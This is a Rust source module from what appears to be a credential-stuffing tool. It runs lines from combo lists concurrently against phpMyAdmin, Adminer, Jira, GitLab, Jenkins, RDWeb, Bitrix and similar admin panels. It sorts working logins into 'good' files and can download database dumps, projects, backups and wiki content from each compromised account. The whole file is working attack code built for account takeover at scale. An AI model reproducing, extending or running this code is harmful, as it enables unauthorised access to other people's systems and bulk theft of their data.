//! AdminPanel-style mixed list: auto service + bucket files by error class.

use crate::{
    append_error_log_tagged, classify_error_tag, failure_bucket_filename,
    format_adminpanel_good_line, ProgressCallback, ProgressEvent,
};
use anyhow::{bail, Result};
use chrono::Local;
use pma_core::{Credential, MixedService, MixedTarget, ScanResult, ScanStatus};
use pma_net::{
    download_adminer_account, download_bamboo_account, download_personal_backups,
    download_jira_projects, download_personal_jobs, download_rdweb_account,
    download_personal_projects, download_phppgadmin_dumps, download_phpmyadmin_account,
    download_redmine_projects, download_webapp_account, download_xwiki_content, scan_credential,
    AdminerClientConfig, BambooClientConfig, BitrixClientConfig, RdWebClientConfig,
    GitLabClientConfig, JiraClientConfig, PhpMyAdminClientConfig, PhpPgAdminClientConfig,
    RedmineClientConfig, RedmineExportOptions, WebappClientConfig, XWikiClientConfig,
};
use std::path::{Path, PathBuf};
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, Ordering};
use std::time::Duration;
use tokio::fs;
use tokio::io::AsyncWriteExt;
use tokio::sync::Semaphore;

pub const ADMINPANEL_ERROR_FILE: &str = "Error.txt";
pub const ADMINPANEL_BAD_FILE: &str = "Bad.txt";
pub const ADMINPANEL_CANTCHECK_FILE: &str = "CantCheck.txt";
pub const ADMINPANEL_2FA_FILE: &str = "2FA.txt";

const ADMINPANEL_BUCKETS: &[&str] = &[
    ADMINPANEL_BAD_FILE,
    ADMINPANEL_ERROR_FILE,
    ADMINPANEL_CANTCHECK_FILE,
    ADMINPANEL_2FA_FILE,
];

pub async fn init_adminpanel_output_dir(dir: &Path) -> Result<PathBuf> {
    fs::create_dir_all(dir).await?;
    for name in ADMINPANEL_BUCKETS {
        fs::File::create(dir.join(name)).await?;
    }
    let error_log = dir.join(crate::ERROR_LOG_FILENAME);
    let mut log = fs::File::create(&error_log).await?;
    log.write_all(
        format!(
            "# Errors.log — mixed run started {}\n# buckets: AUTH→Bad.txt NETWORK→Error.txt ERROR→CantCheck.txt CAPTCHA/2FA→2FA.txt\n",
            Local::now().format("%Y-%m-%d %H:%M:%S")
        )
        .as_bytes(),
    )
    .await?;
    Ok(error_log)
}

pub async fn append_adminpanel_good(dir: &Path, service: MixedService, result: &ScanResult) -> Result<()> {
    let path = dir.join(service.good_bucket_name());
    let mut file = fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(&path)
        .await?;
    file.write_all(format_adminpanel_good_line(result).as_bytes()).await?;
    Ok(())
}

pub async fn append_adminpanel_bucket(dir: &Path, filename: &str, line: &str) -> Result<()> {
    let path = dir.join(filename);
    let mut file = fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(&path)
        .await?;
    file.write_all(format!("{line}\n").as_bytes()).await?;
    Ok(())
}

pub async fn append_adminpanel_error(dir: &Path, line: &str) -> Result<()> {
    append_adminpanel_bucket(dir, ADMINPANEL_ERROR_FILE, line).await
}

async fn record_mixed_outcome(
    dir: &Path,
    service: MixedService,
    source_line: &str,
    result: &ScanResult,
) -> Result<()> {
    if result.is_valid() {
        append_adminpanel_good(dir, service, result).await?;
        return Ok(());
    }
    let fail_line = if source_line.is_empty() {
        result.credential.display_line()
    } else {
        source_line.to_string()
    };
    let tag = classify_error_tag(result.status, result.message.as_deref());
    let bucket = failure_bucket_filename(result.status, result.message.as_deref());
    append_adminpanel_bucket(dir, bucket, &fail_line).await?;
    let detail = result
        .message
        .as_deref()
        .unwrap_or(result.status.label());
    append_error_log_tagged(dir, tag, &fail_line, detail).await?;
    Ok(())
}

#[derive(Clone)]
pub struct MixedCheckSettings {
    pub export_timeout_secs: u64,
    pub insecure: bool,
    pub download_files: bool,
}

async fn check_one_mixed(
    target: &MixedTarget,
    settings: &MixedCheckSettings,
) -> ScanResult {
    let cred = target.credential.clone();
    let svc = target.service;
    let out = match run_service_check(svc, &cred, settings).await {
        Ok((status, msg)) => ScanResult {
            credential: cred,
            status,
            message: Some(msg),
            databases: Vec::new(),
        },
        Err(err) => {
            let message = format!("{err:#}");
            let status = status_from_mixed_error(&message);
            ScanResult {
                credential: cred,
                status,
                message: Some(message),
                databases: Vec::new(),
            }
        }
    };
    out
}

fn status_from_mixed_error(message: &str) -> ScanStatus {
    let tag = classify_error_tag(ScanStatus::Error, Some(message));
    match tag {
        "AUTH" | "AUTH_SSO" => ScanStatus::InvalidCredentials,
        "NETWORK" => ScanStatus::Unreachable,
        "CAPTCHA" | "AUTH_MFA" => ScanStatus::Captcha,
        _ => ScanStatus::Error,
    }
}

async fn run_service_check(
    service: MixedService,
    cred: &Credential,
    settings: &MixedCheckSettings,
) -> Result<(ScanStatus, String)> {
    let timeout = Duration::from_secs(settings.export_timeout_secs);
    let dl = settings.download_files;

    if let Some(kind) = service.add_service_kind() {
        let cfg = WebappClientConfig {
            timeout,
            insecure: settings.insecure,
        };
        let (stats, _) = download_webapp_account(kind, cred, &cfg, Path::new("."), dl).await?;
        let detail = if dl {
            stats.detail_line()
        } else {
            format!("check ok — {}", stats.detail_line())
        };
        return Ok((ScanStatus::Valid, detail));
    }

    let msg = match service {
        MixedService::PhpMyAdmin => {
            let cfg = PhpMyAdminClientConfig {
                timeout,
                insecure: settings.insecure,
                ..PhpMyAdminClientConfig::default()
            };
            if dl {
                let (stats, _) = download_phpmyadmin_account(cred, &cfg, Path::new("."), true).await?;
                stats.detail_line()
            } else {
                let r = scan_credential(cred, &cfg).await;
                if !r.is_valid() {
                    bail!("{}", r.message.as_deref().unwrap_or("login failed"));
                }
                format!(
                    "check ok — phpMyAdmin user={} dbs={}",
                    cred.username,
                    r.databases.len()
                )
            }
        }
        MixedService::Adminer => {
            let cfg = AdminerClientConfig {
                timeout,
                insecure: settings.insecure,
                ..Default::default()
            };
            let (stats, _) = download_adminer_account(cred, &cfg, Path::new("."), dl).await?;
            if dl {
                stats.detail_line()
            } else {
                format!("check ok — {}", stats.detail_line())
            }
        }
        MixedService::Jira => {
            let cfg = JiraClientConfig {
                timeout,
                insecure: settings.insecure,
                ..Default::default()
            };
            let (stats, _) = download_jira_projects(cred, &cfg, Path::new("."), dl).await?;
            if dl {
                stats.detail_line()
            } else {
                format!("check ok — {}", stats.detail_line())
            }
        }
        MixedService::Redmine => {
            let cfg = RedmineClientConfig {
                timeout,
                insecure: settings.insecure,
            };
            let (stats, _) = download_redmine_projects(
                cred,
                &cfg,
                Path::new("."),
                dl,
                RedmineExportOptions::default(),
            )
            .await?;
            if dl {
                stats.detail_line()
            } else {
                format!("check ok — {}", stats.detail_line())
            }
        }
        MixedService::GitLab => {
            let cfg = GitLabClientConfig {
                timeout,
                insecure: settings.insecure,
                ..Default::default()
            };
            let (stats, _) = download_personal_projects(cred, &cfg, Path::new("."), dl).await?;
            if dl {
                stats.detail_line()
            } else {
                format!("check ok — {}", stats.detail_line())
            }
        }
        MixedService::Jenkins => {
            let cfg = pma_net::JenkinsClientConfig {
                timeout,
                insecure: settings.insecure,
                ..Default::default()
            };
            let (stats, _) = download_personal_jobs(cred, &cfg, Path::new("."), dl).await?;
            if dl {
                stats.detail_line()
            } else {
                format!("check ok — {}", stats.detail_line())
            }
        }
        MixedService::RdWeb => {
            let cfg = RdWebClientConfig {
                timeout,
                insecure: settings.insecure,
                ..Default::default()
            };
            let (stats, _) = download_rdweb_account(cred, &cfg, Path::new("."), dl).await?;
            if dl {
                stats.detail_line()
            } else {
                format!("check ok — {}", stats.detail_line())
            }
        }
        MixedService::Bitrix => {
            let cfg = BitrixClientConfig {
                timeout,
                insecure: settings.insecure,
                ..Default::default()
            };
            let (stats, _) = download_personal_backups(cred, &cfg, Path::new("."), dl).await?;
            if dl {
                stats.detail_line()
            } else {
                format!("check ok — {}", stats.detail_line())
            }
        }
        MixedService::Bamboo => {
            let cfg = BambooClientConfig {
                timeout,
                insecure: settings.insecure,
                ..Default::default()
            };
            let (stats, _) = download_bamboo_account(cred, &cfg, Path::new("."), dl).await?;
            if dl {
                stats.detail_line()
            } else {
                format!("check ok — {}", stats.detail_line())
            }
        }
        MixedService::PhpPgAdmin => {
            let cfg = PhpPgAdminClientConfig {
                timeout,
                insecure: settings.insecure,
                ..Default::default()
            };
            let (stats, _) = download_phppgadmin_dumps(cred, &cfg, Path::new("."), dl).await?;
            if dl {
                stats.detail_line()
            } else {
                format!("check ok — {}", stats.detail_line())
            }
        }
        MixedService::XWiki => {
            let cfg = XWikiClientConfig {
                timeout,
                insecure: settings.insecure,
                ..Default::default()
            };
            let (stats, _) = download_xwiki_content(cred, &cfg, Path::new("."), dl).await?;
            if dl {
                stats.detail_line()
            } else {
                format!("check ok — {}", stats.detail_line())
            }
        }
        _ => bail!("unsupported in mixed check"),
    };
    Ok((ScanStatus::Valid, msg))
}

pub async fn download_mixed_checks(
    targets: Vec<MixedTarget>,
    unclassified_lines: Vec<String>,
    output: PathBuf,
    settings: MixedCheckSettings,
    threads: usize,
    on_progress: Option<ProgressCallback>,
    cancel: Option<Arc<AtomicBool>>,
) -> Result<()> {
    let _log = init_adminpanel_output_dir(&output).await?;
    for line in unclassified_lines {
        // Unclassified → CantCheck (cannot classify / check)
        append_adminpanel_bucket(&output, ADMINPANEL_CANTCHECK_FILE, &line).await?;
        append_error_log_tagged(&output, "ERROR", &line, "unclassified combo line").await?;
    }
    let semaphore = Arc::new(Semaphore::new(threads.max(1)));
    let mut handles = Vec::with_capacity(targets.len());

    for target in targets {
        if cancel.as_ref().is_some_and(|c| c.load(Ordering::Relaxed)) {
            break;
        }
        let permit = semaphore.clone().acquire_owned().await?;
        let out = output.clone();
        let cb = on_progress.clone();
        let settings = settings.clone();
        let source = target.source_line.clone();
        let service = target.service;
        let display = target.credential.display_line();
        handles.push(tokio::spawn(async move {
            let _permit = permit;
            if let Some(ref callback) = cb {
                callback(ProgressEvent::DumpStarted { target: display.clone() });
            }
            let result = check_one_mixed(&MixedTarget {
                service,
                credential: target.credential,
                source_line: source.clone(),
            }, &settings).await;
            let _ = record_mixed_outcome(&out, service, &source, &result).await;
            if let Some(ref callback) = cb {
                callback(ProgressEvent::ScanResult(result.clone()));
                if result.is_valid() {
                    let detail = result.message.clone().unwrap_or_default();
                    callback(ProgressEvent::Good {
                        target: display.clone(),
                        detail,
                        bytes: None,
                    });
                } else {
                    callback(ProgressEvent::DumpFailed {
                        target: display,
                        error: result.message.clone().unwrap_or_default(),
                    });
                }
            }
        }));
    }

    for h in handles {
        let _ = h.await;
    }
    if let Some(ref callback) = on_progress {
        callback(ProgressEvent::AllComplete);
    }
    Ok(())
}
